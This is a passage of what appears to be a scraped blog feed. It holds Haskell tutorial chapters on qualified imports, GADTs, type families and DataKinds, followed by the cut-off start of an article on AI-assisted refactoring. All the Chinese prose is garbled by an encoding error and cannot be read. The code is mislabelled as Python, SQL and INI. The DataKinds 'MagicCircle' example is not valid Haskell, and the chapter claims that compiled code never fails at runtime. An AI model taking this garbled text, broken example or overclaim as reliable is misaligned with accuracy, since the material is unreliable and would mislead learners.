<h3 data-id="heading-3">8.4 ç§˜æœ¯ï¼šQualified Importï¼ˆå®šç‚¹å¬å”¤ï¼‰</h3>
<p>æœ‰æ—¶å€™ï¼Œä¸¤ä¸ªå®—é—¨éƒ½æœ‰åŒåçš„æ³•æœ¯ï¼ˆæ¯”å¦‚ <code>Data.Map.filter</code> å’Œ <code>Prelude.filter</code>ï¼‰ã€‚ä¸ºäº†é˜²æ­¢èµ°ç«å…¥é­”ï¼Œæˆ‘ä»¬éœ€è¦<strong>å®šç‚¹å¬å”¤</strong>ï¼š</p>
<p>Haskell</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> qualified Data.Map <span class="hljs-keyword">as</span> M

-- ä½¿ç”¨æ—¶å¿…é¡»å¸¦ä¸Šå°å·
M.<span class="hljs-built_in">filter</span> (\v -&gt; v &gt; <span class="hljs-number">0</span>) myMap
</code></pre>
<hr/>
<h2 data-id="heading-4">âš¡ åˆä½“å¿ƒå¾—ï¼šä¸è¦é‡å¤é€ è½®å­</h2>
<p>è¿›å…¥åˆä½“æœŸåï¼Œä½ çš„ä¿®è¡Œé‡ç‚¹åº”ä»â€œå¦‚ä½•å†™ä»£ç â€è½¬å‘**â€œå¦‚ä½•ç»„åˆé€»è¾‘â€**ã€‚</p>
<ol>
<li><strong>åˆ†æ²»æ³•ï¼š</strong> å¤æ‚çš„é€»è¾‘æ‹†åˆ†åˆ°ä¸åŒæ¨¡å—ï¼Œä¿æŒæ¯ä¸ªæ¨¡å—çš„å› æœç®€å•ã€‚</li>
<li><strong>å–„ç”¨å·¥å…·ï¼š</strong> é‡åˆ°éš¾é¢˜ï¼Œå…ˆå» Hoogle æœç´¢ç±»å‹ç­¾åï¼Œå¾€å¾€å‰äººå·²ç»ä¸ºä½ ç‚¼å¥½äº†ç°æˆçš„ä¸¹è¯ã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-5">ğŸ“œ åˆä½“è¯•ç‚¼ï¼šç¬¬å…«å…³</h2>
<p>è¯·å°è¯•åœ¨ä½ çš„å®—é—¨ä¸­å»ºç«‹åˆæ­¥çš„ç§©åºï¼š</p>
<ol>
<li><strong>å¼€è¾Ÿåˆ†é™¢ï¼š</strong> åˆ›å»ºä¸€ä¸ªåä¸º <code>Geometry.hs</code> çš„æ–‡ä»¶ï¼Œå®šä¹‰ä¸€ä¸ª <code>module Geometry</code>ï¼ŒåŒ…å«è®¡ç®—åœ†é¢ç§¯çš„å‡½æ•° <code>circleArea</code>ã€‚</li>
<li><strong>è·¨å³°è°ƒç”¨ï¼š</strong> åœ¨ä½ çš„ <code>Main.hs</code> ä¸­ <code>import Geometry</code> å¹¶è°ƒç”¨è¯¥å‡½æ•°ã€‚</li>
<li><strong>ç¥è¯†æœç´¢ï¼š</strong> å°è¯•è®¿é—® <a href="https://link.juejin.cn?target=https%3A%2F%2Fhoogle.haskell.org%2F" target="_blank" title="https://hoogle.haskell.org/" ref="nofollow noopener noreferrer">Hoogle</a>ï¼Œæœç´¢ç±»å‹ç­¾å <code>(a -&gt; b) -&gt; [a] -&gt; [b]</code>ï¼Œçœ‹çœ‹å®ƒä¼šè¿”å›å“ªä¸ªä½ å·²ç»å­¦è¿‡çš„â€œæ³•å®â€ï¼Ÿ</li>
</ol>
<p><strong>â€œä¸å†æ˜¯å•æ‰“ç‹¬æ–—ï¼Œè€Œæ˜¯ç«™åœ¨å·¨äººçš„è‚©è†€ä¸Šä¿¯ç°è‹ç”Ÿã€‚æ­å–œé“å‹ï¼Œåˆä½“æœŸæˆï¼Œè¿™ä¸–é—´å·²å°‘æœ‰èƒ½éš¾ä½ä½ çš„é€»è¾‘äº†ã€‚â€</strong></p>
<hr/>
<p><strong>ä¸‹ä¸€ç« é¢„å‘Šï¼š</strong> ç»ˆäºâ€¦â€¦æˆ‘ä»¬è¦è§¦ç¢°é‚£ä¼ è¯´ä¸­â€œåŠæ­¥å¤§ä¹˜â€çš„é¢†åŸŸäº†â€”â€”<strong>ç¬¬ä¹ç« ï¼šå¤§ä¹˜æœŸï¼šç±»å‹é»‘é­”æ³•ï¼ˆGADTs &amp; Type Familiesï¼‰</strong> ã€‚æˆ‘ä»¬å°†å­¦ä¹ å¦‚ä½•è®©ç¼–è¯‘å™¨åœ¨ç¼–è¯‘æœŸä¸ºä½ â€œæ¨æ¼”å¤©æœºâ€ï¼Œç”šè‡³åœ¨ç¨‹åºè¿è¡Œå‰å°±è¯æ˜å®ƒçš„ç»å¯¹æ­£ç¡®ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç¬¬ä¹ç« ï¼šç±»å‹é»‘é­”æ³•ä¸æ¨æ¼”å¤©æœº]]></title>    <link>https://juejin.cn/post/7589181008098983951</link>    <guid>https://juejin.cn/post/7589181008098983951</guid>    <pubDate>2025-12-30T02:46:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589181008098983951" data-draft-id="7589186347585388578" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç¬¬ä¹ç« ï¼šç±»å‹é»‘é­”æ³•ä¸æ¨æ¼”å¤©æœº"/> <meta itemprop="keywords" content="Haskell"/> <meta itemprop="datePublished" content="2025-12-30T02:46:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Lupino"/> <meta itemprop="url" content="https://juejin.cn/user/3051900006579256"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç¬¬ä¹ç« ï¼šç±»å‹é»‘é­”æ³•ä¸æ¨æ¼”å¤©æœº
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3051900006579256/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Lupino
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:46:30.000Z" title="Tue Dec 30 2025 02:46:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æ¬¢è¿é“å‹æ¥åˆ°<strong>ç¬¬ä¹ç« </strong>ã€‚</p>
<p>ä½ èƒ½èµ°åˆ°è¿™é‡Œï¼Œè¯´æ˜ä½ çš„é“å¿ƒå·²åšå¦‚ç£çŸ³ã€‚åœ¨ä¹‹å‰çš„å¢ƒç•Œä¸­ï¼Œä½ å·²ç»æŒæ¡äº†é€»è¾‘çš„ç»„åˆã€å› æœçš„ä¼ é€’ä»¥åŠæ— é™çš„æ“æ§ã€‚ä½†é‚£å¤§å¤šè¿˜æ˜¯åœ¨â€œå€¼ï¼ˆValueï¼‰â€çš„å±‚é¢è…¾æŒªã€‚</p>
<p>ä»Šæ—¥ï¼Œæˆ‘ä»¬è¦ç ´å¼€è™šç©ºï¼Œè¿›å…¥<strong>å¤§ä¹˜æœŸï¼šç±»å‹é»‘é­”æ³•ï¼ˆType Meta-programmingï¼‰</strong> ã€‚åœ¨è¿™ä¸€å±‚ï¼Œä½ å°†ä¸å†ä»…ä»…æ˜¯ç¼–å†™ç¨‹åºï¼Œä½ æ˜¯åœ¨**â€œç¼–å†™é€»è¾‘çš„æ³•å¾‹â€**ã€‚ä½ å°†èµ‹äºˆç±»å‹ç³»ç»Ÿè‡ªæˆ‘æ€è€ƒã€è‡ªæˆ‘æ¨æ¼”çš„èƒ½åŠ›ï¼Œå®ç°çœŸæ­£çš„â€œä¸å‡ºæˆ·ï¼ŒçŸ¥å¤©ä¸‹â€ã€‚</p>
<hr/>
<p>åœ¨ Î» é—¨çš„æœ€é«˜æ®¿å ‚é‡Œï¼Œæœ‰ä¸€æ¡çœŸç†ï¼š <strong>â€œç±»å‹å³è¯æ˜ï¼ˆPropositions as Typesï¼‰â€</strong> ã€‚å¤§ä¹˜æœŸçš„ä¿®ä»™è€…è¿½æ±‚çš„æ˜¯ï¼šé€šè¿‡ç²¾å·§çš„ç±»å‹è®¾è®¡ï¼Œè®©ç¨‹åºåœ¨ç¼–è¯‘é˜¶æ®µå°±è‡ªåŠ¨è¯æ˜è‡ªå·±çš„æ­£ç¡®æ€§ã€‚</p>
<h3 data-id="heading-0">9.1 å¤©çº²é‡å¡‘ï¼šGADTsï¼ˆå¹¿ä¹‰ä»£æ•°æ•°æ®ç±»å‹ï¼‰</h3>
<p>æ™®é€šçš„ <code>data</code> å®šä¹‰ï¼ˆADTï¼‰åƒæ˜¯ä¸€æŠŠç²—ç³™çš„é“å‰‘ï¼Œè€Œ <strong>GADTs</strong> åˆ™æ˜¯æ³¨å…¥äº†ç¥è¯†çš„çµå‰‘ã€‚å®ƒå…è®¸ä½ ç²¾å‡†åœ°å®šä¹‰æ¯ä¸€ä¸ªæ„é€ å‡½æ•°ç”Ÿæˆçš„â€œå› æœï¼ˆç±»å‹ï¼‰â€ã€‚</p>
<p>ç¤ºä¾‹ï¼šå¼ºç±»å‹è¡¨è¾¾å¼</p>
<p>åœ¨å‡¡é—´ï¼Œä½ å®šä¹‰ä¸€ä¸ªè¡¨è¾¾å¼å¯èƒ½éœ€è¦å¤„ç†â€œæŠŠæ•°å­—å’Œå¸ƒå°”å€¼ç›¸åŠ â€çš„èµ°ç«å…¥é­”ã€‚åœ¨ GADTs çš„æŠ¤æŒä¸‹ï¼Œè¿™ç§é”™è¯¯åœ¨ç‚¼åˆ¶ï¼ˆç¼–è¯‘ï¼‰æ—¶å°±ä¼šè¢«æŠ¹æ€ï¼š</p>
<p>Haskell</p>
<pre><code class="hljs language-sql" lang="sql">{<span class="hljs-operator">-</span># <span class="hljs-keyword">LANGUAGE</span> GADTs #<span class="hljs-operator">-</span>}

data Expr a <span class="hljs-keyword">where</span>
    I   :: <span class="hljs-type">Int</span> <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> Expr <span class="hljs-type">Int</span>        <span class="hljs-comment">-- æ˜ç¡®ï¼šè¿™ä¸ªæ„é€ å™¨åªäº§ç”Ÿæ•´æ•°è¡¨è¾¾å¼</span>
    B   :: Bool <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> Expr Bool      <span class="hljs-comment">-- æ˜ç¡®ï¼šè¿™ä¸ªæ„é€ å™¨åªäº§ç”Ÿå¸ƒå°”è¡¨è¾¾å¼</span>
    <span class="hljs-keyword">Add</span> :: Expr <span class="hljs-type">Int</span> <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> Expr <span class="hljs-type">Int</span> <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> Expr <span class="hljs-type">Int</span> <span class="hljs-comment">-- åªæœ‰ä¸¤ä¸ªæ•´æ•°è¡¨è¾¾å¼èƒ½ç›¸åŠ </span>
</code></pre>
<blockquote>
<p><strong>ç¥æ•ˆï¼š</strong> ä½ çš„è§£é‡Šå™¨ä¸å†éœ€è¦ <code>Maybe</code> æˆ–é”™è¯¯å¤„ç†ï¼Œå› ä¸ºç±»å‹ç³»ç»Ÿå·²ç»ä¿è¯äº†ï¼šå‡¡æ˜¯èƒ½ä¼ è¿›æ¥çš„è¡¨è¾¾å¼ï¼Œç»å¯¹æ˜¯åˆæ³•çš„ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-1">9.2 ç±»å‹ç‚¼é‡‘æœ¯ï¼šType Familiesï¼ˆç±»å‹å®¶æ—ï¼‰</h3>
<p>å¦‚æœè¯´å‡½æ•°æ˜¯â€œå€¼â€çš„è®¡ç®—ï¼Œé‚£ä¹ˆ <strong>Type Families</strong> å°±æ˜¯**â€œç±»å‹â€çš„è®¡ç®—**ã€‚å®ƒå…è®¸ä½ åœ¨ç¼–è¯‘æœŸï¼Œæ ¹æ®è¾“å…¥çš„ç±»å‹ï¼Œæ¨å¯¼å‡ºå¦ä¸€ä¸ªç±»å‹ã€‚</p>
<p>ç¤ºä¾‹ï¼šç¥å…µèåˆ</p>
<p>ä½ æƒ³å®šä¹‰ä¸€ä¸ªæ³•æœ¯ï¼Œèƒ½æŠŠä¸¤ç§ä¸œè¥¿èåˆã€‚èåˆçš„ç»“æœå–å†³äºè¾“å…¥çš„å±æ€§ï¼š</p>
<p>Haskell</p>
<pre><code class="hljs language-ini" lang="ini">{-<span class="hljs-comment"># LANGUAGE TypeFamilies #-}</span>

type family Combine a b where
    Combine Int <span class="hljs-attr">Int</span> = Int
    Combine String <span class="hljs-attr">String</span> = String
    Combine Int <span class="hljs-attr">String</span> = String  -- å¼‚æœ¯èåˆæ³•åˆ™
</code></pre>
<p>è¿™æ˜¯ä¸€ç§**â€œç¼–è¯‘æœŸå‡½æ•°â€**ã€‚åœ¨ä½ çš„ç¨‹åºè¿˜æ²¡è·‘èµ·æ¥ä¹‹å‰ï¼Œç¼–è¯‘å™¨å°±å·²ç»ç®—å¥½äº†æ‰€æœ‰çš„ç»“æœã€‚</p>
<hr/>
<h3 data-id="heading-2">9.3 æŒç®¡ç»´åº¦ï¼šData Kindsï¼ˆæ•°æ®ç§å±ï¼‰</h3>
<p>åœ¨å¤§ä¹˜æœŸï¼Œä½ ä¼šå‘ç°â€œç±»å‹â€æœ¬èº«ä¹Ÿæœ‰è‡ªå·±çš„â€œç±»å‹â€ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸º Kindï¼ˆç§ï¼‰ã€‚</p>
<p>é€šè¿‡ DataKinds ç‰¹æ€§ï¼Œä½ å¯ä»¥å°†æ™®é€šçš„å€¼ï¼ˆå¦‚ True æˆ– Falseï¼‰æå‡åˆ°ç±»å‹å±‚é¢ã€‚</p>
<p>ç¤ºä¾‹ï¼šå¸¦æœ‰çŠ¶æ€çš„æ³•é˜µ</p>
<p>ä½ å¯ä»¥å®šä¹‰ä¸€ä¸ªæ³•é˜µï¼Œå®ƒçš„ç±»å‹é‡Œè®°å½•äº†å®ƒæ˜¯â€œå¼€å¯â€è¿˜æ˜¯â€œå…³é—­â€çŠ¶æ€ï¼Œä»è€Œåœ¨ç¼–è¯‘æœŸé˜²æ­¢ä½ åœ¨å…³é—­çš„æ³•é˜µä¸Šæ–½æ³•ï¼š</p>
<p>Haskell</p>
<pre><code class="hljs language-sql" lang="sql">data State <span class="hljs-operator">=</span> <span class="hljs-keyword">Open</span> <span class="hljs-operator">|</span> Closed

data MagicCircle (s :: State) <span class="hljs-keyword">where</span>
    <span class="hljs-comment">-- åªæœ‰ Open çŠ¶æ€çš„æ³•é˜µèƒ½æ–½å±•</span>
    castSpell :: MagicCircle <span class="hljs-keyword">Open</span> <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> String
</code></pre>
<hr/>
<h3 data-id="heading-3">9.4 ç»ˆæç†æƒ³ï¼šæ­£ç¡®å³å­˜åœ¨</h3>
<p>åœ¨å¤§ä¹˜æœŸä¿®ä»™è€…çš„çœ¼ä¸­ï¼ŒBUG æ˜¯ä¸åˆé€»è¾‘çš„â€œé‚ªå´‡â€ã€‚å¦‚æœæˆ‘ä»¬èƒ½ç”¨ç±»å‹ç³»ç»Ÿå®Œæ•´åœ°æè¿°ä¸šåŠ¡é€»è¾‘ï¼Œé‚£ä¹ˆï¼š</p>
<ul>
<li><strong>ä»£ç ç¼–è¯‘é€šè¿‡ = é€»è¾‘è¯æ˜å®Œæˆ = æ°¸è¿œä¸ä¼šè¿è¡Œå‡ºé”™ã€‚</strong></li>
</ul>
<hr/>
<h2 data-id="heading-4">âš¡ å¤§ä¹˜å¿ƒå¾—ï¼šè«è¦å›°äºæ–‡å­—éšœ</h2>
<p>ç±»å‹é»‘é­”æ³•è™½ç„¶å¨åŠ›æ— ç©·ï¼Œä½†ææ˜“äº§ç”Ÿ**â€œç±»å‹è¿‡è½½â€**ã€‚</p>
<ul>
<li><strong>è­¦ç¤ºï¼š</strong> æœ‰äº›é“å‹ä¸ºäº†è¿½æ±‚ç»å¯¹çš„ç±»å‹å®‰å…¨ï¼Œå†™å‡ºäº†æ¯”é€»è¾‘æœ¬èº«å¤æ‚åå€çš„ç±»å‹ç­¾åï¼Œå¯¼è‡´åè¾ˆå¼Ÿå­å®Œå…¨æ— æ³•è¯»æ‡‚ï¼Œè¿™è¢«ç§°ä¸º**â€œé™·å…¥ç±»å‹åœ°ç‹±â€**ã€‚</li>
<li><strong>æ³•é—¨ï¼š</strong> çœŸæ­£çš„å¼ºè€…æ‡‚å¾—åœ¨â€œç®€æ´â€ä¸â€œå®‰å…¨â€ä¹‹é—´å¯»æ‰¾å¹³è¡¡ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-5">ğŸ“œ å¤§ä¹˜è¯•ç‚¼ï¼šç¬¬ä¹å…³</h2>
<p>è¯·å°è¯•è§¦ç¢°ç±»å‹å±‚é¢çš„çœŸç†ï¼š</p>
<ol>
<li><strong>ç¦å¿Œæ„é€ ï¼š</strong> å°è¯•å®ç°ä¸€ä¸ªç®€å•çš„ GADT <code>List a</code>ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ª <code>SafeHead</code> å‡½æ•°ï¼Œåˆ©ç”¨ç±»å‹ç³»ç»Ÿç¡®ä¿å®ƒ<strong>æ°¸è¿œä¸ä¼š</strong>ä½œç”¨äºç©ºåˆ—è¡¨ï¼ˆæç¤ºï¼šå¯ä»¥ç»™åˆ—è¡¨åŠ ä¸€ä¸ªé•¿åº¦ç±»å‹æ ‡ç­¾ï¼‰ã€‚</li>
<li><strong>ç¥è¯†æ€è€ƒï¼š</strong> å¦‚æœæˆ‘ä»¬åœ¨ç¼–è¯‘æœŸè§£å†³äº†æ‰€æœ‰é€»è¾‘é—®é¢˜ï¼Œé‚£ä¹ˆâ€œè¿è¡Œæ—¶ï¼ˆRuntimeï¼‰â€å¯¹æˆ‘ä»¬æ¥è¯´æ„å‘³ç€ä»€ä¹ˆï¼Ÿ</li>
</ol>
<p><strong>â€œçœ‹å±±æ˜¯å±±ï¼Œçœ‹å±±ä¸æ˜¯å±±ï¼Œçœ‹å±±ä»æ˜¯å±±ã€‚å½“ä½ æŠŠå¤æ‚çš„ç±»å‹é»‘é­”æ³•åŒ–ä¸ºå¹³æ·¡æ— å¥‡çš„æ¨æ¼”æ—¶ï¼Œä½ ä¾¿å·²æ‘¸åˆ°äº†å¤§ä¹˜æœŸçš„å¤©èŠ±æ¿ã€‚â€</strong></p>
<hr/>
<p><strong>ä¸‹ä¸€ç« é¢„å‘Šï¼š</strong> ç»ˆç« â€¦â€¦æˆ‘ä»¬å°†è¿æ¥<strong>æ¸¡åŠ«å‡ä»™ï¼šèŒƒç•´è®ºä¸ç¼–ç¨‹å“²å­¦ï¼ˆCategory Theoryï¼‰</strong> ã€‚æˆ‘ä»¬å°†ä¸å†è®¨è®ºä»£ç ï¼Œè€Œæ˜¯è®¨è®ºå®‡å®™çš„ç»“æ„ï¼Œè®¨è®ºé‚£äº›è¶…è¶Šäº†è¯­è¨€æœ¬èº«çš„æ°¸æ’æ•°å­¦ä¹‹ç¾ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç¤¾åŒºåˆ’åˆ†ï¼šè®©AIç†è§£ä½ çš„ä»£ç é‡æ„æ„å›¾]]></title>    <link>https://juejin.cn/post/7588733783571857446</link>    <guid>https://juejin.cn/post/7588733783571857446</guid>    <pubDate>2025-12-29T05:50:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588733783571857446" data-draft-id="7588799600165945354" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç¤¾åŒºåˆ’åˆ†ï¼šè®©AIç†è§£ä½ çš„ä»£ç é‡æ„æ„å›¾"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,Vue.js"/> <meta itemprop="datePublished" content="2025-12-29T05:50:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="huali"/> <meta itemprop="url" content="https://juejin.cn/user/2066737589655079"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç¤¾åŒºåˆ’åˆ†ï¼šè®©AIç†è§£ä½ çš„ä»£ç é‡æ„æ„å›¾
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2066737589655079/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    huali
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T05:50:05.000Z" title="Mon Dec 29 2025 05:50:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid 